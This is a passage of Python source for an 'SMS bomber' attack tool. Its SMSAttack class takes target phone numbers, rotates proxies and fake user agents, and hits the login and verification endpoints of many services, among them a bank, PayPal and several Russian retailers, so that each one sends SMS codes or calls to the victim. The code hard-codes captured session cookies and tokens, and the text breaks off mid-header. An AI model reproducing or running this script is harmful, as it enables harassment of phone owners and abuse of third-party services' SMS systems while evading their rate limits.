"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import os
import time
import fade
import ctypes
import random
import asyncio
import aiohttp
import socket
import base64
import urllib3
from datetime import datetime
from sys import platform
from threading import Thread, Lock
from fake_useragent import UserAgent
from colorama import Fore, Style, Back, init
from core.etc.functions import logo_sms, get_lang, get_proxies, generate_email


urllib3.disable_warnings()
init()


class SMSAttack:
    def __init__(self):
        self.r = '0'
        self.r2 = '0'
        self.todo = 0
        self.started = 0
        self.lock = Lock()
        self.lang = get_lang()
        self.proxies = get_proxies()
        self.ua = UserAgent(verify_ssl=False)

    def stat(self):
        if platform == 'win32':
            ctypes.windll.kernel32.SetConsoleTitleW(f"💣 ・ Successs: {self.r}")

        if self.started == self.todo:
            with self.lock:
                if self.lang == 'ru':
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'СТАТУС' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'ОТПРАВЛЕНО: ' + Fore.MAGENTA + self.r + Fore.RED + ' ОШИБКИ: ' + self.r2)
                else:
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'STATUS' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'SENT: ' + Fore.MAGENTA + self.r + Fore.RED + ' FAILS: ' + self.r2)

    async def sms_thread(self, phones, use_proxy, proxy):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            user = self.ua.random
            now = datetime.now()
            st = ''

            if use_proxy == "y" and proxy == "":
                proxy_2 = "http://" + random.choice(self.proxies)
            elif proxy != "":
                proxy_2 = proxy
            else:
                proxy_2 = ""

            for phone in phones:
                email = generate_email()
                winelab = f'{phone[1]}{phone[2]}{phone[3]}%20{phone[4]}{phone[5]}{phone[6]}%20{phone[7]}{phone[8]}' \
                          f'%20{phone[9]}{phone[10]}'
                profi = f'7 {phone[1]}{phone[2]}{phone[3]}-{phone[4]}{phone[5]}{phone[6]}-{phone[7]}{phone[8]}-' \
                        f'{phone[9]}{phone[10]}'
                madyart = f'+7 ({phone[1]}{phone[2]}{phone[3]}) {phone[4]}{phone[5]}{phone[6]} - {phone[7]}{phone[8]} - ' \
                          f'{phone[9]}{phone[10]}'
                growfood = f'{phone[1]}{phone[2]}{phone[3]} {phone[4]}{phone[5]}{phone[6]} {phone[7]}{phone[8]} ' \
                           f'{phone[9]}{phone[10]}'
                letu = f'+7 ({phone[1]}{phone[2]}{phone[3]}) {phone[4]}{phone[5]}{phone[6]}-{phone[7]}{phone[8]}-' \
                       f'{phone[9]}{phone[10]}'

                try:
                    header = {
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'keep-alive',
                        'Content-Length': '23',
                        'Content-Type': 'application/json',
                        'Cookie': 'cfidsmts-w-sso=B0w1G+1PKk+DuR8IXajaSm97z7sdFbtl5dEp0kqL+xtiAr84YFbO2WK0P6ZwcUfmNFx0HKSdgrNts2PwDf+vt/sNYK7276Omyo5VWmK4DQiJlZJu2HL7mBMIuujbf7r2MqeiAnqKqTUkb5pz8u2VMkkxtjfRnJzPHUXF; cfidsmts-w-sso=B0w1G+1PKk+DuR8IXajaSm97z7sdFbtl5dEp0kqL+xtiAr84YFbO2WK0P6ZwcUfmNFx0HKSdgrNts2PwDf+vt/sNYK7276Omyo5VWmK4DQiJlZJu2HL7mBMIuujbf7r2MqeiAnqKqTUkb5pz8u2VMkkxtjfRnJzPHUXF; gsscmts-w-sso=1COyg28HInGWt9635YOxQgstNQkkvCK7XQlPhWoyzQTN7o3Ycy9mxNJfweuhtTCYJuPZfU6sctlGfsJsjF7EZldRrjHoxptk+SMJtO1CkjQAXGPuQIueQGAndVTurOVLkUPF6TM7ZuGnQ/wRkfNDBQySihFgbLrtkB4Pb/4MaCcWPHNW5lc6ZBj0PBTKfNp6fFkB8gRvsD1w0CL7GS/u2lQrdBGjQlnGvUz5UpC/CuHQXhXCil4PP6i4uIlLnV6lQH98V/w30nwO6FE=; gsscmts-w-sso=1COyg28HInGWt9635YOxQgstNQkkvCK7XQlPhWoyzQTN7o3Ycy9mxNJfweuhtTCYJuPZfU6sctlGfsJsjF7EZldRrjHoxptk+SMJtO1CkjQAXGPuQIueQGAndVTurOVLkUPF6TM7ZuGnQ/wRkfNDBQySihFgbLrtkB4Pb/4MaCcWPHNW5lc6ZBj0PBTKfNp6fFkB8gRvsD1w0CL7GS/u2lQrdBGjQlnGvUz5UpC/CuHQXhXCil4PP6i4uIlLnV6lQH98V/w30nwO6FE=; fgsscmts-w-sso=1Mnd502faf56a91d8e0533317e9f3930e2a5c517; fgsscmts-w-sso=1Mnd502faf56a91d8e0533317e9f3930e2a5c517; __zzatmts-w-sso=MDA0dBA=Fz2+aQ==; __zzatmts-w-sso=MDA0dBA=Fz2+aQ==; go_session_id=NDMxZjE3OWUtMzM0Ni00NzhjLThiNDEtOTU0NTNhZGQzMDIw.32652c8f0f7a88fd7752dd9869449599114e488e; __zzatmts-w-payment=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VbO2VSHHxeI0Baf34qFhU0cylMORNdPj5ycys7H1JnR1siQ1c/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoXf2srVwoLZD1BbXQlLTFmJ3xLKTUgGUNqTFVpQHA=WqTAuw==; __zzatmts-w-payment=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VbO2VSHHxeI0Baf34qFhU0cylMORNdPj5ycys7H1JnR1siQ1c/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoXf2srVwoLZD1BbXQlLTFmJ3xLKTUgGUNqTFVpQHA=WqTAuw==; cfidsmts-w-payment=drxoSKTYiiEnrZBFi20oWHDA5ayQcP2PEuy9EB+M9NCXC3PxswfuZAY4oJVejLDufXBT7BkRhUR9rMLFPjNqcfuTDn8tkgz7RTc8zRkXHHln2+GBH6LeS9JLJG9+WjYcG7cokq3g6Gf+/ciz9KARq5IvbEW+/PxcfDPC; cfidsmts-w-payment=drxoSKTYiiEnrZBFi20oWHDA5ayQcP2PEuy9EB+M9NCXC3PxswfuZAY4oJVejLDufXBT7BkRhUR9rMLFPjNqcfuTDn8tkgz7RTc8zRkXHHln2+GBH6LeS9JLJG9+WjYcG7cokq3g6Gf+/ciz9KARq5IvbEW+/PxcfDPC; gsscmts-w-payment=GaI/P+CcGxpS7TSrphPK6G9RYaFR5Fn/knZcPTU+haRPmtPrEkpZgjzJbs34ZziijCTodwV58QAphhfSxwk6ysh7leOcYmWa5XAfGT43kR9lDWFitr9Z3FoTKboh6m14b3E5PpnWLsQUtcir26fKFvd7Z7RIVFrxVr/BRlU5jCV0q1Nm3Jq0qGtDR8vWOKkVn87MUZ8M80fzT/tpuiM99x20kGx6z2+4g3dSptot25FR367efoHv+3/BnZsHdVlGGmEO0dhJ0O9XpcA=; gsscmts-w-payment=GaI/P+CcGxpS7TSrphPK6G9RYaFR5Fn/knZcPTU+haRPmtPrEkpZgjzJbs34ZziijCTodwV58QAphhfSxwk6ysh7leOcYmWa5XAfGT43kR9lDWFitr9Z3FoTKboh6m14b3E5PpnWLsQUtcir26fKFvd7Z7RIVFrxVr/BRlU5jCV0q1Nm3Jq0qGtDR8vWOKkVn87MUZ8M80fzT/tpuiM99x20kGx6z2+4g3dSptot25FR367efoHv+3/BnZsHdVlGGmEO0dhJ0O9XpcA=; fgsscmts-w-payment=WZgJ93c0e513fa94ce9f024d794f0e0882d97b40; fgsscmts-w-payment=WZgJ93c0e513fa94ce9f024d794f0e0882d97b40',
                        'DNT': '1',
                        'Host': 'sso.mtsbank.ru',
                        'Origin': 'https://sso.mtsbank.ru',
                        'Referer': 'https://sso.mtsbank.ru/login/mtsmoney/auth/',
                        'sec-ch-ua': '"Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': user
                    }

                    payload = {
                        "login": phone
                    }

                    await session.post(f'https://sso.mtsbank.ru/api/v2/login', json=payload, headers=header,
                                       proxy=proxy_2, timeout=1)

                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()

                try:
                    header = {
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'qrator_jsr=1680818266.827.uR41XSPbgvUJE8Xa-lpmkcfb190101po5rtn8h9foslqsq079-00; qrator_jsid=1680818266.827.uR41XSPbgvUJE8Xa-1redjnbektn4utj2iq5qul410g6rdnge; currentDeliveryMode=pickup; currentRegion=RU-MOW; currentPOS=C027; qrator_ssid=1680818267.798.xsKAKUr2I4yNKPSP-5a8dnsdnl8empsduf802qc29i9sve34l; dtCookie=v_4_srv_35_sn_C70F1F71341E56B38BF9A05A4DF90220_perc_100000_ol_0_mul_1_app-3Ab08f9e5bb12c9b66_1; anonymous-consents=%5B%7B%22templateCode%22%3A%22adpr%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22generic%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22marketing%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%5D; cookie-notification=NOT_ACCEPTED; JSESSIONID=c8db0bd9-3a21-4785-bd9f-f4fc38e54b5f; rxVisitor=1680818386454AHM0FODTPETFQ6JSPJ2JT19ICCJ7T7BO; dtSa=-; age-confirmed=1; isNearestPos=false; dtLatC=1; rxvt=1680820235546|1680818386455; dtPC=35$218386451_656h22vHNHRKMKCHCNADGPTHMKUBQCSAAMPGQTD-0e0',
                        'dnt': '1',
                        'referer': 'https://www.winelab.ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F',
                        'sec-ch-ua': '"Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-dtpc': '35$218386451_656h22vHNHRKMKCHCNADGPTHMKUBQCSAAMPGQTD-0e0',
                        'x-requested-with': 'XMLHttpRequest'
                    }

                    await session.get(f'https://www.winelab.ru/confirmation/sendByPhone?number={winelab}',
                                      headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-length': '2160',
                        'content-type': 'application/json',
                        'cookie': 'site_version=desktop; first_hit_url=%2F; uid=8CBABAB97E432F64661B1A9002B825C9; geo_city_confirmed=yes; advcake_track_id=c933ef3c-a713-5b3a-cae6-44dfcee9143a; advcake_session_id=3a896168-08ed-0339-4511-eb79acf25417; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiZDNjNTc2ODktOGEyOS00Zjc1LWEzZWYtZjc2YWYwMTg2MTFhIiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6ImM3MDg3NGZkLTQ4N2EtNDJmYi1iM2M5LTYwNDhkZTA3ZjVhYyIsImlhdCI6MTY4MDgxOTA3MiwiZXhwIjoxNjgwODE5NjcyLCJqdGkiOiJkM2M1NzY4OS04YTI5LTRmNzUtYTNlZi1mNzZhZjAxODYxMWEifQ.UoWfOrRIlgP-A2dbQbv5PqhgPwcXp9zL3AH95Yuw7bA; sid=ubq6jGQvQ4KQGhtmySYDAg==; city=msk; ets=%2F%2C%2C1680819081; wtfId=1186662-1680819081.666-194.32.122.23-44425',
                        'dnt': '1',
                        'origin': 'https://profi.ru',
                        'referer': 'https://profi.ru/cabinet/login/',
                        'sec-ch-ua': '"Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-app-id': 'PROFI',
                        'x-new-auth-compatible': '1',
                        'x-requested-with': 'XMLHttpRequest',
                        'x-wtf-id': '1186662-1680819078.359-194.32.122.23-44425'
                    }

                    payload = {"query":"#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c"
                                       "510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, "
                                       "$initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, "
                                       "initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    "
                                       "fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  "
                                       "strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    "
                                       "type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry "
                                       "{\n      answer {\n        __typename\n        errors {\n          "
                                       "__typename\n          code\n          message\n          param\n        "
                                       "}\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n     "
                                       "   __typename\n        errors {\n          __typename\n          code\n     "
                                       "     message\n          param\n        }\n      }\n    }\n    ... on AuthStr"
                                       "ategyResultSuccess {\n      __typename\n      answer {\n        __typename\n  "
                                       "      events {\n          __typename\n          ... on AuthStrategyIAnalyticEv"
                                       "ent {\n            type\n          }\n        }\n      }\n      auth {\n      "
                                       "  loginUrl\n      }\n      step {\n        __typename\n        stepId\n       "
                                       " title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion"
                                       "\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          pho"
                                       "neNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepV"
                                       "alidatePincode {\n          phoneNumber\n          resendDelay\n        }\n "
                                       "       ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n "
                                       "           __typename\n            fieldId\n            type\n            re"
                                       "quired\n            suggestedValue\n          }\n        }\n        ... on Au"
                                       "thStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n"
                                       "          popupUrl\n          windowWidth\n          windowHeight\n        }\n"
                                       "        ... on AuthStrategyStepRequestYandex {\n          appId\n          sco"
                                       "pes\n        }\n      }\n    }\n  }\n}",
                               "variables":{
                                   "type":"phone",
                                   "initialState":{
                                       "phoneNumber":profi,
                                       "defaultOrderCityId":"prfr",
                                       "currentHost":"https://profi.ru"
                                   }
                               }}

                    await session.post('https://spb.profi.ru/graphql', json=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-type': 'application/x-www-form-urlencoded',
                        'cookie': '__ddg1_=Ugw1h8FzFgIdsoFRF8oF; PHPSESSID=bl2srubtrv1nplb0gd05a2729n; cguuid=1667495511_bl2srubtrv1nplb0gd05a2729n; chg_ref=https%3A%2F%2Fwww.google.com%2F; chg_req=https%3A%2F%2Fwww.chitai-gorod.ru%2F; cityId=213; cityName=%C3%EE%F0%EE%E4%20%CC%EE%F1%EA%E2%E0; countryId=643; countryName=%D0%EE%F1%F1%E8%FF; newsite=1; VisitorId=3ee9d4ec-5370-43ea-8217-af98e2de47cb; showed_action-banner-244=1',
                        'origin': 'https://www.chitai-gorod.ru',
                        'referer': 'https://www.chitai-gorod.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-site',
                        'user-agent': user
                    }

                    payload = {"phone":phone,"cgsing":{"type":"reCaptcha","payload":{"token":"03AKH6MREL4KwohmeExSRaqEzcJjTPNWmMSNPTXH2jL4ZBF5Aij7m__fQLV-6flejjTp8yb6qxNVhPIXECKj_sgM1Y93DSeB0KFSVqVXw9YqVBtVL5hbF7bgk3VXhVeZ6qC8mCDCMz-0hrqEOJVwY4EeAnOp03wWH13myDwj_aPOWD72hqL6IBhCErwLlbCuP1zw1NSM_3FvjfeSRTg1E5yTJAUdwdb6IQNeCJVy5WB5LnMyfrZdeNH_z2kANuVgU1hcC3x0aCUc6zTZpUuXEzP02BPPEfeOXtrczl-3YhI42m1I3ATVRYQtzJ4hjyAqoAuMpHNKJHvzxJKB1o-nRnwdM1MQoUxasBr3lHttc980wVJzDrtwm0-5ahN48S2Ljki-1tMmQPOXc2s2tOIHaD1PYgCnLPBrrobEWJHazFWvdQRARGWy4gsqIKm5Nh9Bbgez6zNe94uhl-L57GpGgh0_UL7Up6m0UmyetXTXEabvgFsUS5_PgCuA7XwQygyovSfgcxVPVECcd9KNp7aJ13b6s0qsdu10mIv1ftAZPawlwj5i0umW3VKjK3NoaIHgoJKPbGBT4Z4er0_-yDFFTFvCYOMS08foEy_sMWIMJUov8K-Sufu_jxp8kZdE26YkTvBqAXPR-1qnDamWwzz3P4xBwt4Xe3IgKW3QA-st-tXFKhoqziRH9rrXUBU4D1JEo80N1SacRsawbGjGLGDB1cqdOs75PIfgPt0NYho3mPbQeNpzx_2GzaJjlgMwnrod0lGnWkBxrn_Y4iqCQEFpCemc10TELSS3jWahEQZ7HG5_zBYrNrrrqoRIqbZHxL6YG0XLZPjYkh5n7U-q9XZeRrYQ9qNQduLGIm_14LUPm-Faz0h74baDcLGCGxywVDqPaH3DVsJXstnzqqPYO-mBm_o8MKeaVNsUyU_nKsE9iPcTMYtkzoWDrXYuiTaohr5y2BCyaj1J6TPoUmW9wBQnmZsNH38JyTy3ZeJj26jGdEgeowIfehYD5yE1GC-EQM9LJPo0xWt7FuU9DRSDVzcaSB1nDDj2b0MMc9hU7ZPgn9Afm19-Cm9Sn9sSQsUzwzPnO1vvX9e7CTePbNJ45rPTpIyjD3MfFVyXYDpxje3EfTAFoA2UEYO8kng7KX0noZUX0TM0O6ikUKE_6CWqGPjllSV-Ay1v9MNRkaBmd3k2OpsrhtJFLgfPUJKA1St8xg70RpplwHokCxpFBZ1RvovbvpfmRFIEvrbxp_0cmd0KKck6SCh3Ywfqrsqxo6kIP5Xa-dy74D54-xWUFVrcJlJ8XUoMZVlm8UMyPWCxmpZlwPJ7ryAHJPr0cxhhjVBQ8NznY7UnK4dxl2TTjpg0poBrTUiNE74bVLL83kPw7XZL7tFrw_GxphELnwO7XIaDgeM61tKN9SZbtXOCzxnBOsrJSsfUNwuYPhnNNwHsx_6Jo4GJJl1OkFy7NQ1DhU-IHuQuolSJQCyQ-EDwCLc1dNPDLJR5zqTapJyYtl3Dgakn3jgS5tLbL1yeumYQbaQtrAFOEJlWlZV3rAEtVe10f7osovlz4S3JCpP6waDdooVyiPgJr4JD7j0LYCE44-Awsj841XVhny_oyCX3CjvuEFLiIDWxrqsggqeMW_Zhsb2hdeaYrpL0Y-xGt8MhQ","action":"getSMSCode","version":"rv3"}}}

                    await session.post(
                        f'https://web-gate.chitai-gorod.ru/api/v1/auth/code',
                        json=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json, text/javascript, */*; q=0.01',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                        'content-length': '88',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'dnt': '1',
                        'origin': 'https://widget.verifykit.com',
                        'referer': 'https://widget.verifykit.com/v2.1/?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246&lang=ru',
                        'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-requested-with': 'XMLHttpRequest',
                    }

                    payload = {
                        'countryCode': 'RU',
                        'isMobileBrowser': '0',
                        'phoneOperatingSystem': 'android',
                        'phoneNumber': '+' + phone
                    }

                    await session.post(
                        'https://widget.verifykit.com/v2.1/otp-start?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246',
                        data=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'AB-TESTS': '{"personal_feed":"cumulative"}',
                        'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'keep-alive',
                        'Content-Length': '41',
                        'Content-Type': 'application/json',
                        'Cookie': 'popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; city_auto_popup_shown=1; ccart=off',
                        'DNT': '1',
                        'Host': 'api.sunlight.net',
                        'Origin': 'https://sunlight.net',
                        'sec-ch-ua': '"Not?A_Brand";v="99", "Opera GX";v="97", "Chromium";v="111"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'User-Agent': user,
                        'X-Requested-With': 'SunlightFrontendApp'
                    }

                    payload = {"phone":"+"+phone,"flashcall":True}

                    await session.post('https://api.sunlight.net/v3/customers/authorization/', json=payload,
                                       headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '491',
                        'content-type': 'application/json;charset=UTF-8',
                        'cookie': 'cookie_check=yes; l7_az=dcg13.slc; ts_c=vr%3D3e99499a1840a7a85b13e8eefea07218%26vt%3D3e99499a1840a7a85b13e8eefea07217; cookie_prefs=T%3D0%2CP%3D0%2CF%3D0%2Ctype%3Dexplicit_banner; TLTSID=13181915649569552210254340983466; KHcl0EuY7AKSMgfvHl7J5E7hPtK=V1UVv_rCpouveOJaC68dtRfVkQIfTjOas2fZ6RcFKZK7VfUBI5XEkaev-A1pe11eavhzg7eXC79A0ilK; ddi=DSVyKWWybP-200lx8MsKHE1l2UDCih_iD04O2K7I5WAHk5OV-G116VOmsvJmwFLdkg8yS_1NASNzKK37eNI0YKTprEiFCdtR844oT4szEkoEzci6; LANG=fr_XC%3BKZ; nsid=s%3A8P1aDLhmKkjuM6jrcJB0Q8hs7aSwUv2b.j9ne4A63KYkazQsLGO3LtCWaEiWtTXsxGfE7RP2ChZc; tsrce=authchallengenodeweb; x-pp-s=eyJ0IjoiMTY2NzQ5NzU2NDQyNSIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1762195564%26vteXpYrS%3D1667499364%26vr%3D3e99499a1840a7a85b13e8eefea07218%26vt%3D3e99499a1840a7a85b13e8eefea07217%26vtyp%3Dnew; tcs=main%3Aonbrd%3Asignup%3Aorganic%7CpaypalAccountData_submit',
                        'origin': 'https://www.paypal.com',
                        'referer': 'https://www.paypal.com/kz/welcome/signup/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-csrf-token': 'jy4wGt5Yf5n2oBeYlSBCj0hpEjlTaVz+2f6jg=',
                        'x-requested-with': 'XMLHttpRequest'
                    }

                    payload = {"/appData/action": "init_phone_confirmation", "/appData/griffinData": "true",
                               "/initiatePhoneConfirmData/phoneCountry": "KZ",
                               "/paypalAccountData/phoneOption": "Mobile",
                               "/paypalAccountData/phoneNumber": phone[1:], "/paypalAccountData/phoneCountryCode": "7",
                               "/paypalAccountData/createUpdateReady": False,
                               "/initiatePhoneConfirmData/sendSms": "yes",
                               "/initiatePhoneConfirmData/createUpdateReady": True,
                               "/initiatePhoneConfirmData/phoneNumber": phone[1:],
                               "/initiatePhoneConfirmData/phoneCountryCode": "7"}

                    await session.post('https://www.paypal.com/KZ/welcome/signup', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '0',
                        'cookie': '_pcl=eW5jY/+J6eIKrg==; old_design=0; is_show_welcome_mechanics=1; _tuid=bfa4749db8e83787741b6d039407f632bf8c7dd1; _space=psk_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_analytics=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_main_1_1_98=3; _slfs=1667497919016; _slid=6363ffb10ae16ce93d0f54eb; _slsession=22984220-F353-40B5-9A72-0604DF3D4AC9; _slfreq=6347f312d9062ed0380b52dc%3A6347f38c9a3f3b9e90027775%3A1667505121; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; _slid_server=6363ffb10ae16ce93d0f54eb',
                        'origin': 'https://www.citilink.ru',
                        'referer': 'https://www.citilink.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-requested-with': 'XMLHttpRequest'
                    }

                    await session.post(f'https://www.citilink.ru/registration/confirm/phone/+{phone}/', headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                        'Connection': 'keep-alive',
                        'Content-Length': '24',
                        'Content-Type': 'application/json',
                        'Cookie': 'geo_region_url=www; _ym_uid=16563772911015405951; _ym_d=1656377291; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_site=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; mobile=false; device=pc; _ga=GA1.2.8228657.1662288395; _gid=GA1.2.158704625.1662288395; _gat=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; 